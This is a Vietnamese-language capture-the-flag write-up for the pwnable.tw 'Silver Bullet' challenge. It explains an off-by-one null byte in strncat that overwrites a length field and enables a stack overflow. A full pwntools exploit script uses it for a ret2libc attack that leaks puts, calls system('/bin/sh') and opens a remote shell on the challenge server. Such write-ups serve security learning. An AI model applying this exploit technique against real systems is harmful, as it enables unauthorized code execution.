---
title: '[Pwnable.tw] – Silver Bullet'
slug: silverbullet
type: writeup
date: 2021-12-23
summary: '[Pwnable.tw] – [Silver Bullet](https://pwnable.tw/challenge/#6)...'
tags: [security, writeup]
---

## [Pwnable.tw] – [Silver Bullet](https://pwnable.tw/challenge/#6)
#### main()
#### create_bullet()
Tạo một viên đạn BULLET *bullet có tên là bullet.desc dài tối đa 0x30 kí tự do người dùng nhập vào, set power của bullet là bullet.power = len(bullet.desc).
#### power_up()
Ta có thể tăng sức mạnh cho bullet bằng cách nối dài thêm desc, bullet.power sẽ được cập nhật lại là chiều dài của tên mới. Chiều dài tối đa của bullet.desc vẫn là 0x30
#### beat()
Tiến hành bắn sói, sức mạnh của bullet.power nếu nhiều hơn máu cảu sói thì chiến thắng.
struct bullet
{
char desc[0x30];
int power;
}
struct WereWolf
{
int power ;
char *desc;
}
Sau khi đọc và test thử nhiều lần mình thấy được 1 hàm có thể có lỗi trong hàm power_up(). Hàm strncat() sẽ copy chuỗi desc vào chuỗi bullet.desc, sau đó sẽ thêm 1 ký tự NULL vào cuối chuỗi. Giả sử desc bullet đầu tiên có size là 0x2f, sử dụng hàm power_up() để thêm 0x1 vào desc và hàm strncat() sẽ thêm 1 null byte vào cuối chuỗi và đè lên biến tiếp theo, mà vị trí tiếp theo lại là bullet size. Chúng ta có thể xem các bước debug dưới đây :
Điều đó có nghĩa là size hiện tại đã bị đè thành 0 + 1 bytes vừa thêm thì sẽ là 1. Chúng ta có thể đè thêm 0x2f nữa và điều này có thể giúp chúng ta control được ret.
Đề bài cho file libc_32.so.6, nên mình nghĩ đó là 1 gợi ý để ta dùng kĩ thuật ret2libc.
Ta sẽ overwrite return address thành hàm puts() với tham số là  hàm puts.got mục đích là để chương trình in ra địa chỉ của hàm puts sau khi được load vào vùng .GOT. Tuy nhiên chúng ta cũng phải chèn địa chỉ hàm main vào để có thể tạo loop như sau:
```
def loop(fun,param):
    create('A'*0x20)
    power('B'*0x10)
    power(p32(0x7FFFFFFF) + b"A"*3 + p32(put_plt) + p32(main) + p32(put_got))
    beat()
``````
from pwn import *
#libc = ELF('/lib/i386-linux-gnu/libc-2.31.so')
libc = ELF('./libc_32.so.6')
elf = ELF('./silver_bullet')
main = elf.symbols["main"] #0x8048954 
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
# sysem = libc.symbols['system']
# bin_sh = next(libc.search(b'/bin/sh'))
def create(desc):
    io.sendlineafter("Your choice :",'1')
    io.sendafter("Give me your description of bullet :",desc)
def power(desc):
    io.sendlineafter("Your choice :",'2')
    io.sendafter("bullet :",desc)
def beat():
    io.sendlineafter("Your choice :",'3')
def loop(fun,param):
    create('A'*0x20)
    power('B'*0x10)
    power(p32(0x7FFFFFFF) + b"A"*3 + p32(fun) + p32(main) + p32(param))
    beat()
def exploit():
    loop(puts_plt,puts_got)
    io.recvuntil('Oh ! You win !!\n')
    puts = u32(io.recvuntil('\n')[0:4])
    # puts = io.recvuntil('\n')
    print('puts: '+hex(puts))
    libc_base = puts - libc.symbols['puts']
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    print("Libc base: "+hex(libc_base))
    print("System: "+hex(system))
    print("Bin sh: "+hex(bin_sh))
    loop(system,bin_sh)
    io.interactive()
debug = 0
context.log_level = "DEBUG"
if debug:
    io = process("./silver_bullet")
else:
    io = remote('chall.pwnable.tw',10103)
exploit()
```